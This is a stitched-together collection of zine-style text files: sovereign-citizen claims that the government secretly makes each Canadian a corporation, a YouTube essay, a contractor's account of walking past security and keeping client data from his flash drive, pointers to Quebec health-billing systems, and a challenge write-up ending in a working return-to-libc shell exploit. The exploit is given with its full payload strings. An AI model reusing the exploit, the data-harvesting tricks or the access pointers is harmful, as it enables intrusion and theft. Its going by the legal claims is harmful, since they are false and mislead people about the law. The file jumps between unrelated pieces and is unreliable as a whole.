Here are the exact definitions from Barron's Canadian Law Dictionary, 3rd
edition: natural person. A natural person is a human being that has the
capacity for rights and duties. artificial person. A legal entity, not a
human being, recognized as a person in law to whom certain legal rights and
duties my be attached - e.g. a body corporate.

You will observe that the natural-person has the "capacity"(ie ability) for
rights and duties, but not necassarily the obligation. The artificial-person
has rights and duties that may be attached(ie assigned) by laws.


SECOND TRICK:

The second "trick" of the government is to use the Interpretation Act to
define words that apply to all Statutes, unless re-defined within a part-
icular Statute. Without this knowledge, you could assume the ordinary
meaning for the words you are reading, not realizing that they may have
been re-defined by the Interpretation Act. Unless these words have been
re-defined in another Statute, the underlying definitions for the two
most important words still apply, either from the interpretation Act, or
the Canadian Law Dictionary. Basically they are defined as follow:

from the Canadian Law Dictionary we find that:
INDIVIDUAL means a natural-person.
from the Interpretation Act we find the re-definition:
PERSON means a corporation(an artificial-person).
from the Income Tax Act we find that:
INDIVIDUAL means an artifitial person.
PERSON means an artificial person(amongst other things)

In the Canadian Human Rights Act you will see how INDIVIDUAL and PERSON
are used and how they apply to natural and artificial persons.


THIRD TRICK:

The third "trick" of the government is to use the word "includes" in
definitions instead of using the word "means". They do this in some
critical definitions that they want you to mis-interpret. If they used
"means" instead of "includes" then their deception would be exposed,
but by using "includes" they rely upon the reader to assume that "inc-
ludes" expands the definition, whereas in reality it restricts the
definition in the same manner that "means" restricts the definition.
Here is a "means" definition of the word "person" from the Bank Act:
PERSON "means" a natural person, an entity or a personal representative;
Here is an 'includes' definition of the word "person" f
rom the Interpre-
tation Act: PERSON, or any word or expression descriptive of a person,
'includes' a corporation.

To expose their deception, substitute the word 'means' and you have PER-
SON, or any word or expression descriptive of a person, 'means' a corpo-
ration.(viz-artifitial-person)

Both "means" & "includes" are restrictive in scope because they only en-
compass a part of the whole. Typically they are used in the following
form: person 'means' A or B or C(and nothing else) person 'includes' A
and B and C(and nothing else) There is a Legal Maxim that supports the
restriction of "includes": Inclusio unius est exclusio alterius... The
inclusion of one is the exclusion of another.

The definition of the word "include" is key to understanding your poten-
tial loss of natural-person. This is the major trick used by the govern-
ment in an attempt to take away your natural-person rights. Unless you
know this, you will voluntarily forfeit your rights.


FOURTH TRICK:

The fourth "trick" of the government is to modify how the word "includes"
is used in order to make an EXPANSION in the definition when such expansion 
is required. This "trick" helps add confusion to the use of "includes"
convincing the readers that "includes" is modified to become expansive
rather than restrictive:

also includes
and includes
includes, without limitation
including
the expansive definitions usually take the following form:
PERSON means A or B or C and includes D.


DEFINITIONS:

Barron's Canadian Law Dictionary does not provide definitions for "include"
or "means" therefore we have to look in the next 'source' for the definit-
ions.From Black's Law Dictionary, 4th edition, here is the definition for
the word "include": include. To confine within, hold as in an inclosure,
take in, attain, shut up, contain, inclose, comprise, comprehend, embrace, 
involve. including. may, according to context, express an enlargement and
have the meaning of 'and' or 'in addition to', or merely specify a partic-
ular thing already included within the general words theretofore used.inc-
lose. To surround; to encompass; to bound; fence; or hem in, on all sides.

It is stated in the above definition that the verb INCLUDE only has limited
scope. On the other hand the participle, INCLUDING(but not limited to) en-
larges the scope. When used in a definition, INCLUDE does not expand the 
existing definition of the word. It is easy to confuse because we naturally
assume the existing definition of the word, then assume INCLUDE means to
add this new interpretation to the existing assumed definition of the word. 
Our assumptions fail us in this case. From now on, when you see the word
INCLUDES, mentally substitute the word MEANS and you will not be "tricked"
by this definition anymore.

FOR THE DOUBTING THOMAS:
If you look into any statute, you will be able to find a definition that
uses the word INCLUDES and when you attempt to broaden the scope of that
word, the statute will break down because it will not be able to support
the inclusion of the ordinary meaning of the word.

Today we live in a world where we are told that our fundamental rights
still exist, but there are times when we wonder how this can be so. For
example, we can have the full force of the law brought down upon us with
a traffic violation, income tax regularity, refusing to fill in census
forms, etc. These offences do no harm to another human being and in no
way violate any individuals fundamental rights and freedoms, so we ask 
"how can this be?"

The answer is that your fundamental rights and freedoms are still intact
as a natural-person, but you have been tricked into believing that you
have to follow the Laws created for the artificial-person. Following the
Second World War, the United Nations Assembly prepared the Universal 
Declaration of Human Rights. The assembly called upon all Member countr-
ies to publicize the text of the Declaration and "to cause it to be dis-
seminated, displayed, read and expounded principally in schools and other 
educational institutions, without distinction based on the political
status of countries or territories." I have never seen this done in any
school. Have you?


In order to impliment SLAVERY of it's citizens and control them according
to its whim, the government had to invent a system that would not violate
a human-being's fundamental rights, but would allow the government to
"own" everything produced orgained by its citizens.The technique used by
the government was to create a CORPORATION for every human-being in Canada.
As creator of a CORPORATION, the government can demand anything it wants
from the CORPORATION. As a legal entity, a corporation does not have feel-
ings and cannot be hurt. It can be subject to slavery and complete domina-
tion by it creators and the corporation must obey its creator. These corp-
orations must then have a business number and so one is assigned to each 
PERSON it creates.

Such a number is called a S.I.N.(Slave Identification Number aka Social
Insurance Number) Finally, the government needs to appoint an Officer of
the CORPORATION to run the day-to-day activities. Such a position requires
a contract since the Officer will be held accountable for the actions of
the CORPORATION. So, the government tricks John Doe to become the Officer
for the JOHN DOE corporation by signing such contracts as Driver's Licence,
BankAccounts, Citizenship Cards, Passports, etc. In the 'Income Tax Act',
the government just decrees that John Doe is the legal Representative for
the Officer of the JOHN DOE Corporation and the only contract involved in
the annual Income Tax Return(yes it is a contract for one year) wherein
John Doe gives his aggreement as Officer of JOHN DOE for the previous year.
Unfortunately John Doe does not know that he is an Officer for the JOHN
DOE corporation and must therefore follow the rules imposed upon JOHN DOE.
Hence the confusion sets in because John Doe believes that he is JOHN DOE
and therefore has to forfeit his rights and duties upon demand by the gov-
ernment and its officials.


CAPITALIZATION:

There are five different levels of capitalization used in names of "persons";

human-being: john doe
natural-person: John Doe
quasi natural/artificial-person: John DOE
corporation/artificial-person: JOHN DOE
Nomme de Guerre: DOE, JOHN

Here is a summary of the rights and freedoms of the above "persons":
The 'human-being' has all the unalienable rights and freedoms as provided
by GOD.

The 'natural-person' has all the rights and freedoms as provided by man
with the Magna Charta and Canadian Bill of Rights.

The 'quasi natural/artificial-person has lost some rights, but not all
rights. At this time it is not evident how to quantify which rights have
been  lost.

The 'corporation/artificial-person' has limited rights and freedoms as
provided by the creator of the Corporation.

The' Nomme de Guerre has no rights and freedoms and is a complete slave
to the Admiral.

There is so much more than what I have just shared here. It is only the
tip of the iceberg. But it is also enough to make you aware of what you
are up against and the deceptions built into our system of rule by gove-
rnments. Somethings to think about. I have no ID, no drivers license, no
passport, no bank accounts, no address. I AM, a human being. I require
no such things. Free yourselves now. your humble servant, ancient clown

Monopoly Money


FOREWORD:

This is the second in a series of articles I am writing based on the file 'word
wise' on hackcanada. Keep in mind that these files are not to be taken as legal
advice, I now only know bits and pieces of the bigger picture, and only write
these as I learn. These files are meant to inspire you to research and learn
more on your own, this is much to complex a subject to make a 'how to manual'.
Use at your own risk.


PAPER MONEY

Paper money, the standard currency in Canada and many other countries in the
world. But have you actually looked at a $20 bill? I mean REALLY looked at it?
On the bottom, or the side depending on the year of the bill, in small text it
reads ''THIS NOTE IS LEGAL TENDER''. This statement is key. In section 2 of
the Bills of Exchange act, a NOTE is defined as:


''note''

<<billet>>

''note'' means promissory note;


and VALUE is defined as


''value'' << version anglaise seulement >>

''value'' means valuable consideration


From what I have learned, the definition of 'note' from the Bills of Exchange
act applies directly to our paper money. What does this mean? This means that
the paper money has no real value, it's an instrument of debt, a official, set
numetical value, interchangeable I.O.U. And how can it truly have value? Value
of objects is based on supply and demand. Gold and Silver have been the medium
of exchange for mellenia as gold and silver are very rare metals (also because
gold and silver were for all intents and purposes, useless in practical appli-
cation at the time, being to rare and too weak for heavy use) Gold was the
official medium exchange between nations and governments (i.e. Royalty) and
silver the means of exchange among people. These metals are ideal as mediums
of exchange as there is a set amount of it. As soon as it's all dug up, there
will be no more, therefore it's value will not change, and has not changed for
thousands of years in reality. Oh sure, it's price has changed, but that's be-
cause the value of money (based on gold and silver) has fluctuated. Our paper
'money' has jumped up and down and all over the place all the time, we even
have reports on tv about the current comparative value of the dollar. True
money has a finite, set value. Paper money is printed, so the more you print,
the less it is worth (which is part of the reason old bills are destroyed, to
keep the value from plummeting). Think about that, this means when you give
paper money for goods or services, you are technically giving a debt note,
promising to pay for it at some point. An economy based on debt. This is
starting to get reflected in everything, mortgages, leases, buy now pay later
sales. Think about it.


BIRTH CERTIFICATE

We all have them. That nice, piece of paper issued to each of us as we are born
into the world, binding you into this system before you even have the chance or
capeabilities to have a say in the matter. But have you ever examined your birth
certificate? well, if you didn't examine your money, chances are you haven't
examined your birth certificate. On the bottom left hand corner, observe the
text:

'CANADIAN BANK NOTE COMPANY, LIMITED.'

This is important. Take notice that it is copyrighted to the Canadian Bank Note
company, but it does not say anywhere on the certificate that this is a bank
note, so this is not currency as we know it. This is more of a reciept, a better
analogy would be when you buy an animal, say for example a horse. You can't just
give the owner some cash and walk away with a horse. Instead, you buy the papers
with the horse, and update the registry. The birth certificate is the papers.
The government wants you to believe you are the holder of these papers, thereby
making you responsible for them, like the horse you would be property, a slave.
But this is not the case (at least not yet) in reality, you are the bearer of
the papers.

According to section 2 of the Bills of Exchange act (ahh, good ol' section 2);


''holder''

<<detenteur>>

''holder'' means the payee or endorsee of a bill or note who is in possession of
it;

''bearer''

<<porteur>>

''bearer'' means the person in possession of a bill or note that is payable to the
bearer;


Ok, so I lied a little you are not the bearer, your mirror image is the bearer.
Note the word 'person' in bearer. But this still means you are not completely
enslaved, as the birth certificate is payeable to the bearer. Holder, means you
are the payee, payee means you are paying for it. In reality, a slave pays for
themself, right? They work for free (barring sustainance) and make profit for
the master. Huh, a lot like how the system works.


END

Keep in mind as always, take this with a grain of salt. This information is based
mostly on experiance and logical extrapolation, what works for me may not work for
you. This is not a manual, these are guidelines. Do not take this as legal advice,
I am not a lawyer. I try, but I can only learn this stuff as quickly and as accur-
ately as I come across it. Do your own research and come to your own conclusions,
there are just too many variables for there to be one finite solution.

More of my files, as well as digital copies of the acts and bills I find are loca-

Prometheus Rose from.... Youtube?

I've recently caught onto a new morph of the internet craze, Youtube.
For background, it's an online video-blog website that allows users to
post their own videos, provided it meets the guidelines (non-porn,
under 10 minutes and 100 megabytes). It seems to be a gathering ground
of new movie trailers, silly videos teenagers and 20-somethings make.
Until last week.

Then I found a video posted by the user "geriatric1927". It was a
short introductory video, and would normally be dismissed, except for
one thing: the user is 79 years old. People saw this, and caught onto
the fact that someone of those years was using the technology: some
berated it and left nasty comments, but for the most part, people were
shocked and left comments asking for more-- stories of his life, the
war, etc.

This man didn't realize what he had done (and I think he's still
struggling to understand the interconnectivity), but he stayed, and
made another video or two very wisely addressing the craze, and
continuing to delve into his life story a bit. His videos started
getting 50,000+ views, and he's now posted more than 8 videos that are
forming a brief autobiography and his philosophy on life. In one of
the videos, where he addresses the reaction all the people had to him,
and in particular, his discovery of a new world full of young people
willing to listen to him, he nearly broke to tears, displaying a
snippet of humanity all but extinct on the site.

In the last few days, his account has skyrocketed to one of the most
popular, and he's begun to recieve media attention-- all a bit
overwhelming for an old English codger just looking for a friend. The
wisdom he has shown in addressing all the attention seems to be
solidying praise in comments. People have started calling him the
"Youtube Grandpa".

From my observation, America seems to target youth culture, and value
youth and superficial beauty above all else. It's a reflection of the
country-- 230 years old, versus the legacies of European countries
which go back thousands of years. Due to this and the technological
influx in the 90s, there is a clear generation gap between the WW2
generation and the Internet generation. Technology, attention span,
discipline, and general life focus are all very different.

One of the problems I've had with the Internet generation is the lack
of discipline. There is no guiding light, so many people tend to
assume a state of pseudo-autonomy, even to the extent of disregarding
advice and wisdom in general. While part of this is teenage angst,
there is also a separation with disrupts young people and prevents
them from constructing a solid mental foundation (which may have led
to the state of the US now).

In the past, from what I've seen, oral history and tradition was
important, not only to preserve lifes of people, but also so young
people knew how they came to be. There's a big difference between
reading about war, and hearing stories from the people who lived
through it. So many people I know don't understand their heritage at
all, nor do they care.

I'm wondering if Youtube could provide a way for the older generation
to reach out and deliver these lessons. Although it's not truly
intimate, it's still very personal, and perhaps it could instill
values which prevent many of the problems with which we're faced
today.

Authorized Access

Years ago I read the textfiles that got many young phone phreaks started. Some
of these actually had the suggestion that just asking for a tour of a central
office would get you in and walking around with a helpful switch tech. I'm not
sure if this was ever true, but it always led to my trying (and failing) to
work up the nerve to bang on the door and ask for a look around. I'm sure that
I would have exploded if I knew that 10 years later I would be in and out of
more switching stations, NOCs, military research centers and government offic-
es than I could comfortably count. I'm a little less socially awkward and a
little more confident these days, but the ultimate tool for getting through
the door at the regional Secret Service office and being left to wander around
at Telecordia wasn't a matter of touchy-feely self improvement, it was getting
a job.

I spent two long years working a field tech job for an enormous IT provider.
The company in question handled field services for several computer manufactu-
rers (Dell was our bread and butter), and provided on-the-ground support for
companies that maintained overseas help desks for their IT. I was recruited
over the phone, never saw a drug test and if I was ever the subject of a back-
ground check I was not informed.

I was amazed by the scope and variety of organizations used the machines we
supported, and incidentally, just how frequently users managed to destroy 
them (office employees at Verizon Wireless are hands-down the most abusive
end-users in the world). I was surprised by the hours (alot), the pay (a 
little) and the attitude (WAY too much); but what shocked me the most was
how cavalier most IT staff were with visiting contract techs. I became quite 
used to completing my repairs and finding my own way out of buildings unesc-
orted, meandering through half the building without security or employees 
batting an eyelash. Despite being a professional screwdriver jockey, no one
ever asked what I was scrawling down in a reporters notebook while I pulled 
their laptops apart, and many admins just accepted that I was trustworthy
enough to be left alone in a machine room with VPN credentials taped to the 
wall over my head or root passwords left on Post-Its next to the keyboard
while they ran out for a smoke. Please understand that a receptionist once
paged an end-user with "the Hell's Angels are here for your laptop".

After a few visits (and frequently some advice on maintenance for their home
PC) receptionists would frequently issue me a permanent contractor's badge 
and tell me to let myself in so I could make my rounds more quickly. Expla-
ining that I had to ferry several more armloads of parts in from my vehicle 
was a sure-fire way to get a 'Contractor: No Escort Required' pass to the
building even if I wasn't well known. Security guards were frequently too 
underpaid to care about collecting a security pass from someone carrying a
large cardboard box, hand tools and bellowing into a cheap Nextel phone 
breezing past them. I habitually saved old security passes, and would often
short-circuit long security screenings by using a side door that people 
smoked at and pasting an old badge on.

The most potentially abusive techniques from my job were actually part of
the company policy: always warm up the repaired machine and check it thor-
oughly to prevent the dreaded 'the tech left and it still doesn't work!' 
phone call. I got so into the mantra that I carried a flash drive with me 
at all times with some diagnostic software on it, and about 500 megs of
free space. Most end-users were so pleased that I stopped and spent 10
minutes checking their repair out that they tipped me, and no one ever
asked what I had installed on their machine to test out their new mother-
board. Occasionally migrating data from a failed unit to another computer
before an unrepairable laptop was sent back made me a very popular tech.
Not erasing my flash drive afterward made me a very well informed tech.

The iron-clad rule with the company was that *all* replaced parts be coll-
ected and returned regardless of their status as working or not. Many 
manufacturers send out pre-imaged drives within the first 90 days of purc-
hase if a software failure occurs. These two policies together meant that
I frequently left sites with readable (but not booting) HDDs chock-full of
data that support staff had failed to wipe. Several spin-offs from the old 
AT&T was notoriously sloppy with outbound drives.

## == Datapac == Odds and ends
################################################

Note: This is more a data shippment than an article. I would have loved to
give more info and go in more depth about this, but RL as been taking too
much of my time lately, so there at least you have the essence of my findings.

/*****************************************************/
/* 2007-04-27 10:09:01 PM : Starting article writing */
/* ### Intro ###                                     */
/*****************************************************/

Ah, Datapac. That big obscure network, that name you see on the back of most
POS machines, that really old thing... well guess what? It is still being used.
Why, would you ask? Why should I know? But my guess would go on accessibility
vs cost. As a matter of fact, the biggest network in the world - if you skip
the Pentagon and Walmart (yea, Walmart really has the second biggest network
worldwide) - would probably be the telephone network. And that's why Switched-
Packet networks can be so useful - because they are all interlinked, and you
have access to it from everywhere (but that is all theorical bullshit - opini-
on, if you prefer).

I have been trying to find stuff for Datapac, the most important SPN available
in Canada - for a couple of years now on and off. Hard thing to do, especially
when you don't have an NUI. But how far more exciting is it to find something
valuable in an environment where search engines are nowhere to be found?

One of the interesting thing I had found was the access door to the RAMQ
billing system. For those who don't know what it is, it's the Quebec governm-
ent agency responsible for the public health care system. If you are a Quebec
citizen, you have access to health services, providing you have a RAMQ card
with a file number - the equivalent to Medicare. 

So we will be talking about how their system has evolved - sort of. So why
call the article Datapac - Odds and ends? Simply because the article will
have some goodies for people interested in the matter, and because as you
will see, it is the start and the end of the following "story".

And if you read nicely, you may get some extra goodies at the end...

Notice : This is not a very technical article. I Just wanted to share the
things I have found during my research over various networks, so you may
do what you wish with them. Hell, get caught and go to jail if you want.

/* 2007-04-27 10:27:42 PM : Gathering infos...       */
/* ### Part 1 - The end of BLAST ###                 */
/*****************************************************/

BLAST was the name of the previous billing system of the RAMQ (oh yeah,
it's pronounced RAM-Q), which has been in use since the very early ages
of Datapac. It has been in function until May 2006, where the system has
ceased to be in operation. The access to the server was usually done 
by a third party software .

But what third party software? Well, the RAMQ has put to the disposition
of whoever interested pretty much all the documentation about how to
become a software developper and created standards for file structures
and file format to be used in those softwares. So anyone with some progra-
mming knowledge and a bit of will could - and, actually, can, since you
can still develop apps which will connect through the net - start his own
business in the matter.

Starting in the year 2000, the RAMQ has been starting to plan the retreat
of its BLAST system from Datapac. The last time I had read about BLAST was
in 2004, when no end dates were on. So when I got back to it and saw that
it was no longer online, I was somehow a little bit sad. However, some of
the softwares developped after 2000 had the possibility to connect through
either Datapac, iNet2000 or Internet. So I figured I still may find somet-
hing fun in those - if I could manage to find some stuff.

And hence, I did...

/*****************************************************/

Nowaday, every medical specialist (doctor, dentist, etc.) in Quebec has to
connect to the Internet billing registry of the RAMQ to get paid for the
work they do. There is a Web access available to configure certain account
parameters (see links below), but that is where the RAMQ services ends -
which means you are on your own (sort of) in terms of getting the bills in.
Hence, that means nearly every doctor office in Quebec has a software with 
connection informations to plug themselves into the RAMQ databases.

Here is a short list of the best apps I have found:

/** Softwares ***********************************************/

####ParamPC#####
* http://www.param.qc.ca/downloadfr.php
** Have I told you ANYONE could develop their RAMQ apps? :D

Not bad. I have found few thing of interest in there.


####logipromedic#####
* http://logipromedic.com/
** Can't remember if I tried it...

Oh yeah. You may find something useful with that.

####Med-Office####
*ftp://infodata.ca/

Ah, Med-Office... We'll come back to it a bit later... But it is a good,
one, works on Mac and PC.

/** End Softwares *******************************************/

There are many mores you may find, but with these ones, I think you can
get... well, pretty far.

I have not really used the followings for the writing of this article,
but I think whoever would be interested into digging into the structure
of the RAMQ (perhaps writing your own stuff) will use this stuff.

But you said you'd talk about datapac stuff!!! Yes, yes, but this is
rather interesting too. See, nearly every Quebec citizen has a RAMQ
number. So I just thought you may become interested into finding more
about it.

Lot's of data, but few things concerning Datapac, or SPN. Until I get my
hands on this (thanks to the very nice people at InfoData, the creators
of Med-Office). This is a configuration file used to bill other Agencies
than the RAMQ. An application, called CCD, was previously developed by
InfoData to offer the possibility to transfer billing infos between
health specialists and different health care insurance organisation.

Phiral Challenge Explained - By omin0us (anthony.lineberry@gmail)
http://dtors.ath.cx

phiral.com is the website of the author of the book 'Hacking: The Art of 
Exploitation'. The author (Jon Ericson) posted a piece of challenge code written
by his friend Jose Ronnick. Anyway, the challenge is a clever piece of C code
that is locally exploitable. Many constraints were put in place to make it much
more difficult to exploit than your standard buffer overflow. I will walk you
through his code, and explain the solution I came up with that will lead to
exploitation and give us a shell. :]

First off... the vulnerable code

/*------------[End Code]------------------------------------------------------------*/



The very first constraints you may notice are given in the comment at the start of
the code. Exploit using no shellcode. Assume a non executable stack. Drats. Oh well.
This really isn't much of a problem at all.

Alright, lets look at the first little block of code and explain what its doing.

	data = (char *) malloc(20);
    loc = data + 16;
    *((long *)loc) = (long)message;
    location = (long *) loc;

Here we have a pointer called data that has 20 bytes allocated to it. We then take
the pointer called loc and point it to the address of data+16. So now loc is a
pointer to the last 4 bytes of memory in data's 20 byte allocation. 

On the next line, we then make the address loc points to, hold the address of 
the defined string called message. Lastly, we then make the pointer location point
to the last 4 bytes of data as well.

Here is a little diagram.

               16 bytes                       4 bytes
  [___________________________________|_address of 'message'_]
  ^                                   ^
data                             loc/location


Our next little block of code is pretty simple. We check if we have more that 2
arguments supplied on the command line, and if so, we point loc to that argument.
Otherwise, we set loc to be a NULL pointer.

    if(argc > 2)
        loc = argv[2];
    else
        loc = 0;


Next we have our first coded constraint. This block of code basically states that
if our first supplied argument is more than 38 characters long, the 34th and 35th
(remeber, real men as well as arrays start counting at 0) character must be 
0xff & 0xbf respectively. This still shouldn't present a problem.

Our next block of code starts to actually do something.

    bzero(buffer, 100);
    buf_len = strlen((char *)*location) + strlen(argv[1]);
    strncat(buffer, (char *)*location, strlen((char *)*location));
    strncat(buffer, argv[1], strlen(argv[1]));
    buffer[buf_len] = 0;

First off, we are zeroing out our 100 byte buffer that has been statically alloca-
ted on the stack. Now, if you have a keen eye, you may notice that this buffer can
be overflowed by incorrect use of strncat(). But lets not jump on that, as it's not
actually the part of the program that we want to exploit believe it or not.

Anyway, we calculate the length of argv[1] + the length of the 'message' string.
(yet we don't use this value for anything at the moment other than terminating the
last byte of the buffer.) We then concatenate location's string into buffer, and
then concatenate argv[1] onto the end of buffer. So, knowing this, and knowing that
we don't want to overflow buffer which is 100 bytes. And seeing that the message
string is 53 bytes, this allows us to provide at most 47 bytes for the first argum-
ent.

On to our next block of code.

	if(loc)
    {
        if(strlen(loc) > 15) exit(1);
        if(strlen(loc) < 14)
        {
            if(loc[14] == 0)
                memcpy(data, loc, 17);
            else
                strcpy(data, loc);
        }
    }

So looking at this, we can recall from before that loc will either be NULL, or will
be pointing to our 2nd argument, depending on if we provided a 2nd argument or not.
Assuming we did provide a 2nd argument, this piece of code checks that the argument
is less than 15 characters long. If it is, the program exit()'s. So here is another
constraint. Our 2nd argument must be <= 14 characters in length. 

The next little bit now checks if our string is less than 14 characters. If it is,
then we check if the 15th byte (loc[14]) is == 0. If it is, then we copy 17 bytes
of memory, starting at the address of our 2nd argument, argv[2], into our data
buffer. Otherwise, we just strcpy the argument into data's buffer.

This should raise a little red flag in your head. Assuming that loc[14] is == 0,
we copy 17 bytes of memory into data's 20 byte buffer... but wait. Aren't only
the first 16 bytes unoccupied? As the last 4 bytes of data contain the address
of our message string... Looks like we have a Now have control of 1 byte of
that address. :]
Lets keep that in mind.
Also, another constraint. In order to be able to copy those 17 user supplied bytes,
our 2nd argument must be no longer than 13 characters. So with that in mind,
that means that the 14th byte of will be NULL (0). And the 15 byte (loc[14]) will
then be the first byte of memory of your Environment variables. We can see that
here is this little snippet from a gdb session

(gdb) p (char *)(loc+14)
$34 = 0xbfbffcc4 "USER=omin0us"
(gdb) x/5s loc+14
0xbfbffcc4:      "USER=omin0us"
0xbfbffcd1:      "LOGNAME=omin0us"
0xbfbffce1:      "HOME=/home/omin0us"
0xbfbffcf4:      "MAIL=/var/mail/omin0us"
0xbfbffd0b:      "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/games:/usr/local/sbin:/usr/local/bin:/usr/X11R6/bin:/home/omin0us/bin"
(gdb)

So...how can we get an extra NULL onto the argument stack to trick it into copying
those 17 user supplied bytes of data. Well duh... we just provide a null argument.
But then we need a 16th and 17th byte that will get copyied into data's memory.
As we dont want to just use the first 2 bytes inside our environment variable 
memory. So we need to figure out what to do with that.

So knowing all this, that means we will need to provide 4 arguments to this program.
Onward...

    buf_len = strlen((char *)*location) + strlen(argv[1]);
    printf("%s (%d)\n", buffer, buf_len);

    clearmem(envp);
    clearmem(argv);
    bzero(0xbfffff00, 250);

    if(buf_len < 56)
        func(buffer);

Ok, next we compute the length of our message string plus argv[1]. And print the
contents of buffer, and the length we just calculated.

Then we call 2 functions that just go through, and clear out all of our argument
memory as well as environment variables. And then clears 250 bytes starting at
the top of the stack (only on some systems though. I've found this to actually
just crash the program on more modern Linux kernels as well as BSD machines.)
Lastly, we check if our calculated buffer length is less than 56 bytes, and if
so, pass that buffer to func().

void func(char *src)
{
    char buffer[56];
    strcpy(buffer, src);
}

func() then copies this supplied data into a 56 byte static buffer on the stack.
Good thing we have a check that the passed in buffer is less than 56 bytes long
before we call this function or we'd be FUCKED!!! But unfortunately, it already
is.

So lets review what we know.
1. We need to supply 4 command line arguments.
2. The first argument is limited to 47 bytes. Of which, the 34th and 35th byte must
   be 0xff and 0xbf.
3. The 2nd argument is limited to 13 characters.
4. In order to overwrite the 17 bytes of data, we need a 3rd Null argument.
5. Our 4th argument will be the bytes that overwrite the 1 byte that we control
   of the message string address.
6. We cannot use shellcode.
7. We must assume a non-executable stack.

Alright, lets get to crafting our exploit. The entire flaw in this whole design is
these two lines:

            if(loc[14] == 0)
                memcpy(data, loc, 17);

We can take advantage of this, because the last 4 bytes contain the address of the
message string which is 53 bytes long. If we overwrite the last byte of the string's
address, we can trick the buf_len calculation at the end to return a shorter length
and then be able to pass in our full 100 byte buffer!

so lets give this a go.

(gdb) run `perl -e 'print "A"x33 . "\xff\xbf" . "A"x12'` `perl -e 'print "A"x13'` "" `perl -e 'print "\x70\x70"'`
Starting program: /home/omin0us/matrixchallenge/mxc `perl -e 'print "A"x33 . "\xff\xbf" . "A"x12'` `perl -e 'print "A"x13'` "" `perl -e 'print 
"\x70\x70"'`
Are two bytes enough for you? =) <matrix@phiral.com>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÃ¯Â¿Â½Ã¯Â¿Â½AAAAAAAAAAAA (47)

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)

Yay! we overwrite the return address in func()! We our 4th argument of "A\x70" changed
the last byte of the message string to be 0x70. You can see that by setting a break
point in the program and inspecting the pointers value.

(gdb) n
59                                      memcpy(data, loc, 17);
(gdb) p/x *location
$4 = 0x80489a0
(gdb) n
65              buf_len = strlen((char *)*location) + strlen(argv[1]);
(gdb) p/x *location
$5 = 0x8048970
(gdb)

we went from 0x80489a0 to 0x8048970, a difference of 48 bytes. So now the strlen() of
the message string returns 0. This added with argv[1]'s length, gives us 47 bytes for
buf_len at the end.

Now we need to do something with our controlled return address. How about we spawn a
shell. We can use a pretty standard Return-to-LibC attack for this.
First we need to find out the address of the system() function in memory.

(gdb) p system
$10 = {<text variable, no debug info>} 0x28084784 <system>
(gdb)

If you play around with the arguments a bit, you will discover that the bytes over
writing the return address are the 8th-11th bytes of the first argument.

(gdb) run `perl -e 'print "A"x7 . "BBBB" . "A"x22 . "\xff\xbf" . "A"x12'` `perl -e 'print "A"x13'` "" `perl -e 'print "A\x70"'`
Starting program: /home/omin0us/matrixchallenge/mxc `perl -e 'print "A"x7 . "BBBB" . "A"x22 . "\xff\xbf" . "A"x12'` `perl -e 'print "A"x13'` "" `perl 
-e 'print "A\x70"'`
Are two bytes enough for you? =) <matrix@phiral.com>
AAAAAAABBBBAAAAAAAAAAAAAAAAAAAAAAÃ¯Â¿Â½Ã¯Â¿Â½AAAAAAAAAAAA (47)

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)

You will see the return address now got overwritten with all 'B's, So that is where we
want to supply the address of system in libc. All that is needed now is an argument
for system. how about... "/bin/sh" :) So we need to place that as a string somewhere,
and supply that address as an argument. How about we place it at the end of our first
argument? That way it gets null terminated. So here is our command line now.

(gdb) run `perl -e 'print "A"x7 . "\x84\x47\x08\x28" . "A"x22 . "\xff\xbf" . "A"x5 . "/bin/sh"'` `perl -e 'print "A"x13'` "" `perl -e 'print "A\x70"'`

Lets look at the address of buffer now.

(gdb) p &buffer
$12 = (char (*)[100]) 0xbfbffacc
(gdb)

knowing that buffer is 100 bytes long. and /bin/sh is 7 chars, we can compute our
address by 0xbfbffacc+93

(gdb) p (char *)(0xbfbffacc+93)
$15 = 0xbfbffb29 "/bin/sh"
(gdb)

So now we must supply the address of system(), 4 bytes of crap, and then the address
of the string "/bin/sh" on the end of our 1st argument.

so that gives us this as our command line argument of

(gdb) run `perl -e 'print "A"x7 . "\x84\x47\x08\x28" . "CRAP" . "\x29\xfb\xbf\xbf" . "A"x14 . "\xff\xbf" . "A"x5 . "/bin/sh"'` `perl -e 'print "A"x13'` 
"" `perl -e 'print "A\x70"'`

Which gleefully presents us with a shell :)

(gdb) run `perl -e 'print "A"x7 . "\x84\x47\x08\x28" . "CRAP" . "\x29\xfb\xbf\xbf" . "A"x14 . "\xff\xbf" . "A"x5 . "/bin/sh"'` `perl -e 'print "A"x13'` 
"" `perl -e 'print "A\x70"'`
Starting program: /home/omin0us/matrixchallenge/mxc `perl -e 'print "A"x7 . "\x84\x47\x08\x28" . "CRAP" . "\x29\xfb\xbf\xbf" . "A"x14 . "\xff\xbf" . 
"A"x5 . "/bin/sh"'` `perl -e 'print "A"x13'` "" `perl -e 'print "A\x70"'`

40+ Years of the Electronic Playground

   For those who know me well it is no surprise that I have been no
stranger to the world of technology in a way not always regarded as
typical.  I may have done what is considered part of today's
electronic society, but it was not typical for a kid to be walking
around with a machine pumping tunes in 1969!  Nor was it commonplace
to be communicating with numerous folks near and far using pseudonyms
in 1975!

   A lot began with my fascination for the radios in my house.  I
noticed how the radio would come alive at nightfall with the sounds
of clear channel stations on the Standard Broadcast radio band (later
known as AM) from US cities such as Salt Lake City (KSL 1160), Seattle
(KIRO 710, KOMO 1000), Chicago (WGN 720, WBBM 780, WLS 890), Minneapo-
lis/St. Paul (WCCO 830, KSTP 1500), and others in varying strengths.
A regional giant from Bismarck (KFYR 550) was available 24 hours a day,
although CBK 540 (Now known as CBC Radio One in Saskatchewan) caused
great havoc in hearing Bismarck's signal (later learned this was
purposely done to prevent the Americanization of our beloved Canadian
society).

   1966 saw the radio go live on the road!  Before then, we did not
have a radio in the family car.  This was a magical marvel, getting
the new family car!  I will never know what made the car radio so
superior in capability to receive stations from so far away so
clearly.  To make a radio in a house receive such required the
stringing of long wires and pounding spikes into the ground (learned
from having one of these Build-Your-Own-Crystal-Radio kits and
connecting the antenna and ground to the terminals on the back of the
tube radio, a 1946 RCA Victor Model 80, one of the first radios with
FM, a unit I still have).  Not only could you hear more stations at
night from far away places but you could hear numerous stations from
up to 400 miles away during daytime hours, many of whose power levels
